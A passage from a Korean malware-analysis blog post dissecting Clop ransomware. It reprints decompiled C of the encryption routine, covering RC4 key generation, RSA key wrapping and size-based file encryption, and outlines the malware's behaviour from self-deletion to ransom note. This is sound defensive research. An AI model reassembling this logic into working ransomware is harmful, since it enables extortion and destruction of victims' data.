- .LNG : 언어팩 파일
- .TTF : 폰트 파일
- .CMD : 배치 파일
- .BAT : 배치 파일
- .CLLP : 현재 랜섬웨어 암호화 파일
</code></pre>
<p><img src="https://user-images.githubusercontent.com/49066484/119606505-abcbd480-be2d-11eb-8b1d-0f1463e21523.png" alt="그림24"></p>
<p>조건을 만족하게 되면 앞에서 받아온 암호화 관련 key, 구조체, 핸들값들을 구조체로 만들고 CreateThread를 호출한다. 이 구조체는 CreateThread의 실행 함수의 인자로 쓰이며 해당 함수는 <code>파일을 암호화하는 함수</code>이다.</p>
<p>파일을 암호화 할 때 파일 크기가 17000보다 작으면, 암호화를 진행하지 않는다.</p>
<p>파일 크기가 17000보다 크다면,  파일 크기에 따라 두 가지 방법으로 나뉜다. </p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( args-&gt;fileSize &gt; <span class="number">2132432</span> )             <span class="comment">// 파일 크기가 2132432보다 클 때 암호화 루틴</span></span><br><span class="line">   &#123;</span><br><span class="line">     v17 = CreateFileMappingW(v3, <span class="number">0</span>, <span class="number">4u</span>, <span class="number">0</span>, <span class="number">2132432u</span>, <span class="number">0</span>);</span><br><span class="line">     NumberOfBytesRead = (DWORD)v17;</span><br><span class="line">     <span class="keyword">if</span> ( !v17 )</span><br><span class="line">       <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">     lpBuffer = MapViewOfFile(v17, <span class="number">6u</span>, <span class="number">0</span>, <span class="number">0x10000</span>u, <span class="number">0x1F89D0</span>u);<span class="comment">// 파일 내용을 메모리에 맵핑</span></span><br><span class="line">     <span class="keyword">if</span> ( !lpBuffer )</span><br><span class="line">       <span class="keyword">goto</span> LABEL_31;</span><br></pre></td></tr></table></figure>

<p>파일 크기가 2132432보다 크면 CreateFileMapping함수를 호출하는데 이는 파일 크기가 크기 때문에 open,read,write에 대한 오버헤드 역시 커져 메모리에 맵핑 후 수정하는 방식(MMF)을 사용한 것이다.</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v18 = VirtualAlloc(<span class="number">0</span>, <span class="number">0x75</span>u, <span class="number">0x3000</span>u, <span class="number">4u</span>);</span><br><span class="line">rc4_key = v18;</span><br><span class="line"><span class="keyword">if</span> ( v18 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memset</span>(v18, <span class="number">0</span>, <span class="number">0x75</span>u);</span><br><span class="line">  v20 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    rc4_key[v20++] = sbox[random_range(<span class="number">0</span>, <span class="number">256</span>)];</span><br><span class="line">  <span class="keyword">while</span> ( v20 &lt; <span class="number">117</span> );</span><br><span class="line">  <span class="keyword">if</span> ( !*rc4_key &amp;&amp; !rc4_key[<span class="number">1</span>] &amp;&amp; !rc4_key[<span class="number">2</span>] &amp;&amp; !rc4_key[<span class="number">3</span>] &amp;&amp; !rc4_key[<span class="number">5</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    qmemcpy(rc4_key, &amp;fixed_key, <span class="number">0x75</span>u);</span><br><span class="line">    v2 = v33;</span><br><span class="line">  &#125;</span><br><span class="line">  nNumberOfBytesToRead = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<p>sbox에서 랜덤으로 값을 가져와 rc4_key를 만든다. 만약 조건을 만족하면 고정된 key를 사용하는데 이는 악성코드 제작자가 사용하기 위한 용도일 것이다.</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v21 = CreateFileW(&amp;FileName, <span class="number">0x40000000</span>u, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4u</span>, <span class="number">0x80</span>u, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( WriteFile(v21, <span class="string">&quot;Cllp^_-&quot;</span>, <span class="number">7u</span>, &amp;nNumberOfBytesToRead, <span class="number">0</span>)</span><br><span class="line">  &amp;&amp; (nNumberOfBytesToWrite = <span class="number">0</span>,</span><br><span class="line">      encrypted_key = (BYTE *)VirtualAlloc(<span class="number">0</span>, <span class="number">0x87</span>u, <span class="number">0x3000</span>u, <span class="number">4u</span>),</span><br><span class="line">      v23 = v2-&gt;hKey,</span><br><span class="line">      v28 = (DWORD)encrypted_key,</span><br><span class="line">      encrypt_key(rc4_key, (<span class="keyword">int</span>)&amp;nNumberOfBytesToWrite, (<span class="keyword">int</span>)v2, v2-&gt;pki, v2-&gt;hProv, v23, encrypted_key),</span><br><span class="line">      WriteFile(v21, (LPCVOID)v28, nNumberOfBytesToWrite, &amp;nNumberOfBytesToRead, <span class="number">0</span>))</span><br><span class="line">  &amp;&amp; v28 )</span><br><span class="line">&#123;</span><br><span class="line">  v24 = (<span class="keyword">void</span> (__stdcall *)(LPVOID, SIZE_T, DWORD))VirtualFree;</span><br><span class="line">  VirtualFree((LPVOID)v28, <span class="number">0</span>, <span class="number">0x8000</span>u);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  v24 = (<span class="keyword">void</span> (__stdcall *)(LPVOID, SIZE_T, DWORD))VirtualFree;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>암호화에 쓰일 rc4_key를 만든 후 암호화 대상 파일의 이름과 같은 이름의 <code>.clip</code>확장자의 파일을 만든다. 그리고 <code>clip^_-</code>문자열과 rc4_key값을 encrypt_key함수를 통해 RSA로 암호화한 후 해당 파일에 적는다.  (rc4_key를 encrpyt하는 과정)</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">if</span> ( v21 )</span><br><span class="line">      CloseHandle(v21);</span><br><span class="line">    rc4_init((<span class="keyword">int</span>)rc4_key, <span class="number">117</span>, (<span class="keyword">int</span>)&amp;a3);</span><br><span class="line">    rc4_encrypt((<span class="keyword">char</span> *)lpBuffer, <span class="number">0x1F89D0</span>u, (<span class="keyword">char</span> *)&amp;a3);</span><br><span class="line">    UnmapViewOfFile(lpBuffer);</span><br><span class="line">    v4 = (<span class="keyword">void</span> (__stdcall *)(HANDLE))CloseHandle;</span><br><span class="line">    CloseHandle((HANDLE)lpBuffer);</span><br><span class="line">    CloseHandle((HANDLE)NumberOfBytesRead);</span><br><span class="line">    v24(rc4_key, <span class="number">0</span>, <span class="number">0x8000</span>u);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>만든 rc4_key를 가지고 <code>rc4_init</code>,<code>rc4_encrypt</code>함수를 호출하여 암호화 대상 파일을 암호화 한다. (파일을 encrypt하는 과정)</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;                                           <span class="comment">// 파일 크기가 2132432 보다 작거나 같을때 암호화 루틴</span></span><br><span class="line">  v6 = args-&gt;fileSize;</span><br><span class="line">  NumberOfBytesRead = <span class="number">0</span>;</span><br><span class="line">  v28 = <span class="number">0</span>;</span><br><span class="line">  SetFilePointer(v3, <span class="number">0x4000</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  nNumberOfBytesToRead = v6 - <span class="number">0x4000</span>;</span><br><span class="line">  v7 = GlobalAlloc(<span class="number">0x40</span>u, v6 - <span class="number">0x4000</span>);</span><br><span class="line">  v29 = v7;</span><br><span class="line">  <span class="keyword">if</span> ( v7 &amp;&amp; ReadFile(v5, v7, nNumberOfBytesToRead, &amp;NumberOfBytesRead, <span class="number">0</span>) )</span><br></pre></td></tr></table></figure>

<p>파일 크기가 2132432보다 작으면 메모리 mapping 방식이 아닌 read,write 방식을 사용하고, 나머지 encrypt 방식은 위와 동일하다.</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  v8 = VirtualAlloc(<span class="number">0</span>, <span class="number">0x75</span>u, <span class="number">0x3000</span>u, <span class="number">4u</span>);</span><br><span class="line">  rc4_key_ = v8;</span><br><span class="line">  <span class="keyword">if</span> ( v8 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(v8, <span class="number">0</span>, <span class="number">0x75</span>u);</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      rc4_key_[v10++] = sbox[random_range(<span class="number">0</span>, <span class="number">256</span>)];</span><br><span class="line">    <span class="keyword">while</span> ( v10 &lt; <span class="number">117</span> );</span><br><span class="line">    <span class="keyword">if</span> ( !*rc4_key_ &amp;&amp; !rc4_key_[<span class="number">1</span>] &amp;&amp; !rc4_key_[<span class="number">2</span>] &amp;&amp; !rc4_key_[<span class="number">3</span>] &amp;&amp; !rc4_key_[<span class="number">5</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      qmemcpy(rc4_key_, &amp;fixed_key, <span class="number">0x75</span>u);</span><br><span class="line">      v2 = v33;</span><br><span class="line">    &#125;</span><br><span class="line">    NumberOfBytesWritten = <span class="number">0</span>;</span><br><span class="line">    v11 = CreateFileW(&amp;FileName, <span class="number">0x40000000</span>u, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4u</span>, <span class="number">0x80</span>u, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( WriteFile(v11, <span class="string">&quot;Cllp^_-&quot;</span>, <span class="number">7u</span>, &amp;NumberOfBytesWritten, <span class="number">0</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      nNumberOfBytesToWrite = <span class="number">0</span>;</span><br><span class="line">      v12 = VirtualAlloc(<span class="number">0</span>, <span class="number">0x87</span>u, <span class="number">0x3000</span>u, <span class="number">4u</span>);</span><br><span class="line">      v13 = v2-&gt;hKey;</span><br><span class="line">      lpBuffer = v12;</span><br><span class="line">      encrypt_key(rc4_key_, (<span class="keyword">int</span>)&amp;nNumberOfBytesToWrite, (<span class="keyword">int</span>)v2, v2-&gt;pki, v2-&gt;hProv, v13, (BYTE *)v12);</span><br><span class="line">      v14 = (<span class="keyword">void</span> *)lpBuffer;</span><br><span class="line">      <span class="keyword">if</span> ( WriteFile(v11, lpBuffer, nNumberOfBytesToWrite, &amp;NumberOfBytesWritten, <span class="number">0</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v14 )</span><br><span class="line">          VirtualFree(v14, <span class="number">0</span>, <span class="number">0x8000</span>u);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v11 )</span><br><span class="line">      CloseHandle(v11);</span><br><span class="line">    v7 = (<span class="keyword">void</span> *)v29;</span><br><span class="line">  &#125;</span><br><span class="line">  rc4_init((<span class="keyword">int</span>)rc4_key_, <span class="number">117</span>, (<span class="keyword">int</span>)&amp;a3);</span><br><span class="line">  v15 = nNumberOfBytesToRead;</span><br><span class="line">  rc4_encrypt((<span class="keyword">char</span> *)v7, nNumberOfBytesToRead, (<span class="keyword">char</span> *)&amp;a3);</span><br><span class="line">  v16 = hFile;</span><br><span class="line">  SetFilePointer(hFile, <span class="number">0x4000</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  WriteFile(v16, v29, v15, &amp;v28, <span class="number">0</span>);</span><br><span class="line">  v7 = (<span class="keyword">void</span> *)v29;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F232dfd6a-97dd-45df-b9ef-a609fb657267%2FUntitled.png?table=block&id=4d8ce2e0-0edd-4ccb-988e-4bee344d600f&spaceId=44ba02b7-7ecf-4128-9edf-5ee9c344b1ed&width=2130&userId=e7831838-17fc-4bd5-a7cd-ecea2f88bb55&cache=v2" alt="img"></p>
<p>encrypt하는 방식은 크기와 무관하지만, 범위는 다르다. 암호화 되는 범위는 위와 같다.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119608828-922c8c00-be31-11eb-9473-0c60a4024516.png" alt="그림26"></p>
<p>파일을 암호화 한 뒤 해당 경로에 <code>README_README.txt</code>의 랜섬노트를 만드는 것을 확인할 수 있다.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/119608699-585b8580-be31-11eb-8162-11e65de4f6d5.png" alt="그림25"></p>
<p>위와 같은 방법으로 암호화를 진행하며 <code>encrypt_thread</code> 함수는 여러 함수에서 호출된다. 이는 다양한 path에 대한 파일을 찾는 부분은 여러개지만 암호화에 사용되는 함수는 똑같음을 의미한다.</p>
<h1 id="Malicious-behavior"><a href="#Malicious-behavior" class="headerlink" title="Malicious behavior"></a>Malicious behavior</h1><h2 id="Flow"><a href="#Flow" class="headerlink" title="Flow"></a>Flow</h2><ol>
<li>악성코드 유포</li>
<li>악성코드 자가 삭제 batch 파일 생성, 루프 돌면서 끝날 때까지 체크</li>
<li>WinCheckDRVs 서비스로 악성코드 등록</li>
<li>모든 드라이브를 돌면서 암호화 대상 파일을 체크 및 암호화</li>
<li>암호화된 파일 경로에 암호화에 쓰인 rc4_key값을 rsa로 암호화 한 내용을 저장(.clip)</li>
<li>암호화된 파일 경로에 랜섬노트 생성</li>
</ol>
<h2 id="Functions"><a href="#Functions" class="headerlink" title="Functions"></a>Functions</h2><p><img src="https://t1.daumcdn.net/cfile/tistory/99129C365FFC135619?original" alt="img"></p>
<h1 id="Execution"><a href="#Execution" class="headerlink" title="Execution"></a>Execution</h1><p><img src="https://user-images.githubusercontent.com/49066484/119609368-6c53b700-be32-11eb-8e1b-d9f599f36a51.png" alt="KakaoTalk_20210522_195528233"></p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
<li><a href="https://www.youtube.com/watch?v=XlPqUO_A4VM&amp;ab_channel=%ED%8B%B0%EC%98%A4%EB%A6%AC%ED%8B%B0%EB%B9%84TheoriTV">https://www.youtube.com/watch?v=XlPqUO_A4VM&amp;ab_channel=티오리티비TheoriTV</a></li>
<li><a href="https://wogh8732.tistory.com/363?category=828183">https://wogh8732.tistory.com/363?category=828183</a></li>
<li><a href="https://www.notion.so/S2W-LAB-Analysis-of-Clop-Ransomware-suspiciously-related-to-the-Recent-Incident-c26daec604da4db6b3c93e26e6c7aa26">https://www.notion.so/S2W-LAB-Analysis-of-Clop-Ransomware-suspiciously-related-to-the-Recent-Incident-c26daec604da4db6b3c93e26e6c7aa26</a></li>
</ul>
]]></content>
      <categories>
        <category>Research</category>
      </categories>
      <tags>
        <tag>Malware</tag>
        <tag>Windows</tag>
        <tag>Clop</tag>
        <tag>Ransomware</tag>
      </tags>
  </entry>
</search>
